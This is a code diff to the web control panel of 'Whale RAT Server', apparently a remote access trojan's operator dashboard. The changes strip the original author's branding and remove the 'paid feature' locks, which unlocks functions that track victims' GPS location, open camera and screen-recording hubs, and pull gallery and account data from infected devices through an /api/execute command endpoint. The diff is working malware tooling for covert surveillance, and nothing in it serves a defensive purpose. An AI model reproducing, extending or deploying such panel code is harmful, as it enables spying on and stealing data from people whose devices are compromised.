@@ -2435,17 +2435,11 @@
                     <div>
                         <div class="brand-title">Whale RAT Server</div>
                         <div class="brand-subtitle">
-                        <a href="https://github.com/zidhuxdev">    
-                            @zidhuxd
-                        </a>
+                            psylligent
                         </div>
                     </div>
                 </div>
-                <div class="brand-mark">
-                    <a href="https://zidhuxd.com" target="_blank">
-                    <img src="https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/brand/zidhuxd-icon-white.png" alt="Brand Mark">
-                </a>
-                </div>
+                
                 <div class="topbar-actions">
                     <button type="button" class="theme-toggle" id="notif-mute-btn" onclick="toggleNotifMute()" title="Toggle Notification Sounds" aria-label="Toggle Notifications">
                         <i class="fas fa-bell"></i>
@@ -2527,14 +2521,8 @@
 
                         <!-- Global Map Tab -->
                         <div id="global-map-tab" class="tab-content" style="position:relative;">
-                            <div id="global-map" style="filter:blur(10px); opacity:0.25; width:100%; height:100%;"></div>
-                            <div style="position:absolute; inset:0; background:rgba(0,136,204,0.25); backdrop-filter:blur(8px); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:10; text-align:center; padding:20px;">
-                                <div style="font-size:3.5rem; color:#0088cc; margin-bottom:14px;"><i class="fas fa-lock"></i></div>
-                                <h3 style="color:#fff; font-family:'Marcellus',serif; font-size:1.3rem; margin-bottom:8px;">GLOBAL MAP — PAID FEATURE ONLY</h3>
-                                <p style="color:#fff; font-size:0.95rem; margin-bottom:18px; max-width:380px;">This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro</p>
-                                <a href="https://t.me/zidhuxd" target="_blank" style="background:#0088cc; color:#fff; text-decoration:none; padding:12px 26px; border-radius:6px; font-weight:600; display:inline-block;">DM @zidhuxd to buy WhaleRAT Pro</a>
-                            </div>
-                        </div>
+                            <div id="global-map" style="width:100%; height:100%;"></div>
+                            
 
                         <!-- Terminal Hub Tab -->
                         <div id="terminal-hub" class="tab-content">
@@ -3036,8 +3024,7 @@
             if (targetEl) targetEl.classList.add('active');
 
             if (id === 'global-map-tab') {
-                showPaidModal();
-                // No background map tracking or polling process
+                initMap();
             } else {
                 if (mapLoopAudio) mapLoopAudio.pause();
                 if (mapInterval) {
@@ -4037,43 +4024,13 @@
             } catch (e) { console.error('Fetch devices error:', e); }
         }
 
-        function showPaidModal() {
-            let modal = document.getElementById('paid-feature-modal');
-            if (!modal) {
-                modal = document.createElement('div');
-                modal.id = 'paid-feature-modal';
-                modal.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,0.75); backdrop-filter:blur(8px); display:flex; align-items:center; justify-content:center; z-index:99999;';
-                modal.innerHTML = `
-                    <div style="background:#121212; border:1px solid rgba(0,136,204,0.4); padding:30px; border-radius:12px; text-align:center; max-width:400px; width:90%; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
-                        <div style="font-size:2.5rem; margin-bottom:12px; color:#0088cc;"><i class="fas fa-lock"></i></div>
-                        <h3 style="color:#fff; font-family:'Marcellus',serif; font-size:1.1rem; margin-bottom:10px;">WHALERAT PRO</h3>
-                        <p style="color:rgba(255,255,255,0.75); font-size:0.85rem; margin-bottom:20px; font-family:'Montserrat',sans-serif;">This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro</p>
-                        <a href="https://t.me/zidhuxd" target="_blank" style="background:#0088cc; color:#fff; text-decoration:none; padding:12px 24px; border-radius:6px; font-weight:600; display:inline-block; font-size:0.85rem; margin-bottom:12px;">DM @zidhuxd to buy WhaleRAT Pro</a>
-                        <br>
-                        <button onclick="document.getElementById('paid-feature-modal').style.display='none'" style="background:transparent; border:1px solid rgba(255,255,255,0.2); color:rgba(255,255,255,0.6); padding:6px 16px; border-radius:4px; cursor:pointer; font-size:0.75rem;">Close</button>
-                    </div>
-                `;
-                document.body.appendChild(modal);
-            }
-            modal.style.display = 'flex';
-        }
-
         async function exec(a, p) {
             if (!selected) return;
-            const paidActions = ['location', 'gpslocation', 'gps', 'gallery', 'accounts', 'record_video', 'rec_video', 'start_video', 'start_screen_record', 'start_screen_rec', 'record_screen', 'screen_record', 'screen_rec'];
-            if (paidActions.includes(a)) {
-                showPaidModal();
-                return;
-            }
             let url = '/api/execute?uuid=' + selected + '&action=' + a;
             if (p) for (let k in p) url += '&' + k + '=' + encodeURIComponent(p[k]);
             try {
                 const res = await fetch(url);
                 const data = await res.json().catch(() => ({}));
-                if (data.paid) {
-                    showPaidModal();
-                    return;
-                }
                 log('Sent: ' + a);
             } catch (e) { log('Error sending ' + a); }
         }
@@ -4123,11 +4080,10 @@
 
         function openCamHub() {
             if (!selected) return;
-            showPaidModal();
             const hub = document.getElementById('camera-hub');
             hub.style.display = 'flex';
             document.getElementById('hub-device-name').textContent = 'CAMERA HUB: ' + currentName.textContent;
-            updateHubStatus('PAID FEATURE ONLY');
+            updateHubStatus('READY');
         }
 
         function closeCamHub() {
@@ -4159,12 +4115,11 @@
 
         function openScreenHub() {
             if (!selected) return;
-            showPaidModal();
             const hub = document.getElementById('screen-hub');
             hub.style.display = 'flex';
             document.getElementById('screen-hub-device-name').textContent = currentName.textContent;
-            setScreenHubBadge('PAID', 'front');
-            document.getElementById('screen-hub-status').textContent = 'This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro';
+            setScreenHubBadge('LIVE', 'front');
+            document.getElementById('screen-hub-status').textContent = 'Ready';
         }
 
         function closeScreenHub() {
@@ -4792,7 +4747,7 @@
         playNotifChime();
         showToast(icon || 'bell', body);
         if ('Notification' in window && Notification.permission === 'granted' && !notifMuted) {
-            try { new Notification(title, { body, icon: 'https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/brand/zidhuxd-icon-white.png' }); } catch(e) {}
+            try { new Notification(title, { body }); } catch(e) {}
         }
     }
 
@@ -5701,23 +5656,16 @@
 
     function openGpsHub() {
         if (!selected) return;
-        showPaidModal();
         const overlay = document.getElementById('gps-hub-overlay');
         overlay.style.display = 'flex';
         document.getElementById('gps-hub-device-name').textContent = 'TARGET: ' + currentName.textContent;
-        const mapEl = document.getElementById('gps-hub-map');
-        if (mapEl) {
-            mapEl.style.filter = 'blur(8px)';
-            mapEl.style.backgroundColor = 'rgba(0,136,204,0.3)';
-        }
         document.getElementById('gps-hub-loader').style.display = 'none';
         document.getElementById('gps-hub-empty').style.display = 'flex';
         document.getElementById('gps-hub-empty').innerHTML = `
-            <div style="background:rgba(0,136,204,0.2); border:1px solid rgba(0,136,204,0.4); padding:24px; border-radius:12px; text-align:center;">
-                <i class="fas fa-lock" style="font-size:2.5rem; color:#0088cc; margin-bottom:10px;"></i>
-                <h3 style="color:#fff; font-family:'Marcellus',serif; margin-bottom:6px;">GPS HUB — PAID FEATURE ONLY</h3>
-                <p style="color:rgba(255,255,255,0.8); font-size:0.85rem; margin-bottom:14px;">This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro</p>
-                <a href="https://t.me/zidhuxd" target="_blank" style="background:#0088cc; color:#fff; text-decoration:none; padding:10px 20px; border-radius:6px; font-weight:600; display:inline-block;">DM @zidhuxd to buy WhaleRAT Pro</a>
+            <div style="background:rgba(0,136,204,0.15); border:1px solid rgba(0,136,204,0.35); padding:24px; border-radius:12px; text-align:center;">
+                <i class="fas fa-satellite-dish" style="font-size:2.5rem; color:#0088cc; margin-bottom:10px;"></i>
+                <h3 style="color:#fff; font-family:'Marcellus',serif; margin-bottom:6px;">WAITING FOR LOCATION</h3>
+                <p style="color:rgba(255,255,255,0.8); font-size:0.85rem;">Press Refresh to request a GPS fix from the device.</p>
             </div>
         `;
     }
